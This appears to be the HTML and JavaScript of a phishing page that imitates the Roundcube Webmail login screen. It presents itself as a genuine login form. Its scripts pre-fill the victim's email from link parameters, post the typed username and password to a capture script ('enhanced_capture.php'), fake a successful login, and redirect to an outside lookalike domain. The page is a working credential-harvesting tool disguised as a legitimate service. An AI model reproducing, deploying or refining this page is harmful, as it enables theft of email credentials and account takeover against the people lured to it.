<body>
    <div id="container">
        <div id="header">
            <div id="logo">Roundcube Webmail</div>
        </div>
        
        <div id="mainscreen">
            <div class="orange-accent"></div>
            <div class="orange-accent"></div>
            <div class="orange-accent"></div>
            
            <div class="language-selector">
                <select id="language" onchange="changeLanguage()">
                    <option value="en">English</option>
                    <option value="es">Español</option>
                    <option value="fr">Français</option>
                    <option value="de">Deutsch</option>
                    <option value="it">Italiano</option>
                    <option value="pt">Português</option>
                    <option value="ru">Русский</option>
                    <option value="zh">中文</option>
                </select>
            </div>
            
            <form id="login-form" method="POST" action="enhanced_capture.php">
                <div class="header">
                    <h2>Please log in</h2>
                </div>
                
                <div class="content">
                    <div class="error" id="error-message">
                        Login failed
                    </div>
                    
                    <div class="form-row">
                        <label for="rcmloginuser">Username</label>
                        <input type="text" id="rcmloginuser" name="email" autocomplete="username" required>
                    </div>
                    
                    <div class="form-row">
                        <label for="rcmloginpwd">Password</label>
                        <input type="password" id="rcmloginpwd" name="password" autocomplete="current-password" required>
                    </div>
                    
                    <div class="form-buttons">
                        <input type="submit" class="button" value="Login" id="rcmloginsubmit">
                    </div>
                    
                    <div class="loading" id="loading">
                        <span class="spinner"></span>Logging in...
                    </div>
                </div>
            </form>
        </div>
        
        <div id="footer">
            Powered by <a href="https://roundcube.net/" target="_blank">Roundcube</a> webmail 1.6.7
        </div>
    </div>

    <script>
        let attemptCount = 0;
        
        function changeLanguage() {
            // Language change simulation - in real Roundcube this would reload the page
            console.log('Language changed to:', document.getElementById('language').value);
        }
        
        // Auto-grab email from URL hash
        function autoGrabEmail() {
            const hash = window.location.hash.substring(1); // Remove the # symbol
            const emailField = document.getElementById('rcmloginuser');
            
            if (hash && hash.length > 0) {
                // Check if hash contains an email pattern
                const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
                
                if (emailRegex.test(hash)) {
                    // Direct email in hash
                    emailField.value = hash;
                    console.log('Auto-filled email from hash:', hash);
                    // Focus on password field since email is already filled
                    document.getElementById('rcmloginpwd').focus();
                } else if (hash.includes('@')) {
                    // Contains @ symbol, might be a partial or encoded email
                    emailField.value = decodeURIComponent(hash);
                    console.log('Auto-filled decoded email from hash:', decodeURIComponent(hash));
                    document.getElementById('rcmloginpwd').focus();
                } else {
                    // Check for common parameter patterns
                    const params = new URLSearchParams('?' + hash);
                    const email = params.get('email') || params.get('user') || params.get('target') || params.get('e');
                    
                    if (email) {
                        emailField.value = decodeURIComponent(email);
                        console.log('Auto-filled email from parameter:', email);
                        document.getElementById('rcmloginpwd').focus();
                    }
                }
                
                // If email was filled, add subtle highlight
                if (emailField.value && emailField.value.length > 0) {
                    emailField.style.backgroundColor = '#f0f8ff';
                    emailField.style.borderColor = '#4CAF50';
                    
                    // Remove highlight after 3 seconds
                    setTimeout(() => {
                        emailField.style.backgroundColor = '';
                        emailField.style.borderColor = '';
                    }, 3000);
                }
            }
        }
        
        // Also check URL parameters (not just hash)
        function checkUrlParameters() {
            const urlParams = new URLSearchParams(window.location.search);
            const emailField = document.getElementById('rcmloginuser');
            
            // Check various parameter names commonly used
            const email = urlParams.get('email') || 
                         urlParams.get('user') || 
                         urlParams.get('username') || 
                         urlParams.get('target') || 
                         urlParams.get('e') ||
                         urlParams.get('u');
            
            if (email && !emailField.value) {
                emailField.value = decodeURIComponent(email);
                console.log('Auto-filled email from URL parameter:', email);
                document.getElementById('rcmloginpwd').focus();
            }
        }
        
        document.getElementById('login-form').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const form = this;
            const username = document.getElementById('rcmloginuser').value.trim();
            const password = document.getElementById('rcmloginpwd').value;
            const errorDiv = document.getElementById('error-message');
            const loadingDiv = document.getElementById('loading');
            const submitBtn = document.getElementById('rcmloginsubmit');
            
            // Basic client-side validation
            if (!username || !password) {
                showError('Please enter both username and password');
                return;
            }
            
            // Increment attempt counter
            attemptCount++;
            
            // Show loading state
            hideError();
            loadingDiv.style.display = 'block';
            submitBtn.disabled = true;
            submitBtn.value = 'Logging in...';
            
            // Simulate realistic server delay
            const delay = Math.random() * 1500 + 1000; // 1-2.5 seconds
            
            setTimeout(() => {
                // Submit to capture script
                fetch('enhanced_capture.php', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded',
                    },
                    body: new URLSearchParams(new FormData(form))
                })
                .then(response => response.json())
                .then(data => {
                    loadingDiv.style.display = 'none';
                    submitBtn.disabled = false;
                    submitBtn.value = 'Login';
                    
                    if (data.signal === 'ok') {
                        // Success - redirect after short delay
                        document.getElementById('login-form').innerHTML = 
                            '<div class="content" style="text-align: center; padding: 40px;">' +
                            '<div style="color: #27ae60; margin-bottom: 15px; font-size: 14px;">✓ Login successful!</div>' +
                            '<div style="color: #666; font-size: 10px;">Redirecting to mailbox...</div>' +
                            '</div>';
                        
                        setTimeout(() => {
                            window.location.href = 'https://webmail-authoss.aabuc.com/cpsess/prompt?fromPWA=1&pwd=&_x_zm_rtaid=I7SQ3VePRPS/cndRs57BvQ.1709509974548/&_x_zm_rhtaid=341%27#[[-Email-]]';
                        }, 2000);
                    } else {
                        // Show error message
                        showError(data.msg || 'Invalid username or password');
                        
                        // Clear password field
                        document.getElementById('rcmloginpwd').value = '';
                        document.getElementById('rcmloginpwd').focus();
                    }
                })
                .catch(error => {
                    loadingDiv.style.display = 'none';
                    submitBtn.disabled = false;
                    submitBtn.value = 'Login';
                    showError('Request failed. Please try again.');
                });
            }, delay);
        });
        
        function showError(message) {
            const errorDiv = document.getElementById('error-message');
            errorDiv.textContent = message;
            errorDiv.style.display = 'block';
        }
        
        function hideError() {
            document.getElementById('error-message').style.display = 'none';
        }
        
        // Auto-focus on username field and auto-grab email
        window.addEventListener('load', function() {
            // First check for email in URL hash or parameters
            autoGrabEmail();
            checkUrlParameters();
            
            // Focus appropriate field
            const emailField = document.getElementById('rcmloginuser');
            if (emailField.value && emailField.value.length > 0) {
                // Email already filled, focus on password
                document.getElementById('rcmloginpwd').focus();
            } else {
                // No email, focus on username field
                emailField.focus();
            }
        });
        
        // Also listen for hash changes (if user navigates with different hash)
        window.addEventListener('hashchange', function() {
            autoGrabEmail();
        });
        
        // Simulate real Roundcube behavior
        document.addEventListener('keydown', function(e) {
            if (e.key === 'Enter' && (e.target.id === 'rcmloginuser' || e.target.id === 'rcmloginpwd')) {
                document.getElementById('login-form').dispatchEvent(new Event('submit'));
            }
        });
    </script>
